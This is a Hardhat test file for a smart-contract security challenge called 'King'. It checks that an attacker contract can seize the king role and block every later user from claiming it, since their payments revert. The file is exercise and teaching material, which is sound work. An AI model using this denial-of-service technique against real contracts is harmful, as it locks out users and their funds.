const { ethers } = require("hardhat")
const { expect } = require("chai")
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")

describe.only("Challenge 9 - King", function () {
    async function initialStateFixture() {
        const [deployer, maliciousUser, regularUser] = await ethers.getSigners()

        const King = await ethers.getContractFactory("King")
        const targetContract = await King.deploy()
        await targetContract.deployed()

        const N9Attacker = await ethers.getContractFactory("N9Attacker")
        const maliciousContract = await N9Attacker.deploy()
        await maliciousContract.deployed()

        return { deployer, regularUser, targetContract, maliciousUser, maliciousContract }
    }

    describe("Initial State", function () {
        it("Should deploy contracts with correct deployer", async function () {
            const { deployer, targetContract, maliciousContract } = await loadFixture(initialStateFixture)

            expect(targetContract.deployTransaction.from).to.equal(deployer.address)
            expect(maliciousContract.deployTransaction.from).to.equal(deployer.address)
        })

        it("Malicious user is not king", async function () {
            const { maliciousUser, targetContract } = await loadFixture(initialStateFixture)

            const currentKing = await targetContract.connect(maliciousUser)._king()
            expect(currentKing).to.not.be.equal(maliciousUser)
        })
    })

    describe("Attack Execution", function () {
        it("Malicious contract becomes new king", async function () {
            const { deployer, targetContract, maliciousUser, maliciousContract } = await loadFixture(initialStateFixture)

            const txnResponse = await maliciousContract.connect(maliciousUser).kingMe(
                targetContract.address, { value: ethers.utils.parseEther("1.0") }
            )
            await txnResponse.wait();

            const currentKing = await targetContract.connect(deployer)._king()

            expect(currentKing).is.equal(maliciousContract.address)
        })


        it("Should not let anyone become new king", async function () {
            const { regularUser, targetContract, maliciousUser, maliciousContract } = await loadFixture(initialStateFixture)

            let txnResponse = await maliciousContract.connect(maliciousUser).kingMe(
                targetContract.address, { value: ethers.utils.parseEther("1.0") }
            )
            await txnResponse.wait();

            //regular unsuspecting user tries to become king

            /*
                ERROR:
                reason="Transaction reverted: function selector was not recognized and there's no fallback nor receive function"
            */

            try {
                await regularUser.sendTransaction({
                    to: targetContract.address,
                    value: ethers.utils.parseEther("2.0")
                })
            } catch (err) {
                expect(err.reason).to.equal("Transaction reverted: function selector was not recognized and there's no fallback nor receive function")
            }
        })
    })
})